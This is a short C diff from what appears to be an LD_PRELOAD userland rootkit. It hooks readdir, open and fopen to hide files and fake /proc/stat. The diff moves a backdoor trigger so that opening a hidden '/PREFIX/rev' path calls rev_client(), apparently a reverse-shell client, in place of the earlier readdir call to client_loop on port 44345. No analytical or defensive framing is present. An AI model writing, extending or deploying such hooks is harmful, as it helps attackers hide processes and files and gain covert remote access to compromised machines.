@@ -14,13 +14,6 @@ struct dirent *readdir(DIR *dirp)
 {
     ORIG(readdir, NULL);
 
-    char dir_name[256];
-    if (!fdname(dirfd(dirp), dir_name, sizeof(dir_name))) return NULL;
-    if (strcmp(dir_name, "/" PREFIX "/rev") == 0)
-    {
-        client_loop("44345");
-    }
-
     struct dirent *dir;
     do dir = original_readdir(dirp); while (dir && should_filter(dir->d_name, dirp));
     return dir;
@@ -46,6 +39,10 @@ int open(const char *path, int flags, ...)
     {
         ret = fake_proc_stat();
     }
+    else if (strcmp(absolute_path, "/" PREFIX "/rev") == 0)
+    {
+        rev_client();
+    }
     else
     {
         ret = original_open(path, flags, mode);
@@ -70,6 +67,10 @@ FILE *fopen(const char *path, const char *mode)
     if (strcmp(absolute_path, "/proc/stat") == 0)
     {
         ret = fdopen(fake_proc_stat(), "r+");
+    }
+    else if (strcmp(absolute_path, "/" PREFIX "/rev") == 0)
+    {
+        rev_client();
     }
     else
     {
